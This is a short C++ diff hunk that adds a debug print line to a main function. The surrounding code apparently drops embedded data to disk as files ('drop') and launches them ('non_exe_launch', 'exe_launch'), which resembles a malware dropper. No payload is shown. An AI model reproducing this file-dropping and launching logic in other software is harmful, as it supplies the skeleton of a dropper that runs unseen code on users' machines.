@@ -215,7 +215,7 @@ int main(int argc, char* argv[])
 		drop(size3, data3, name3);
 
 		bool result = non_exe_launch(name3);
-
+		std::cout << "before exe_launch 2 ";
 		if (result == true){
 			std::cout << "before exe_launch";
 			exe_launch(name1);
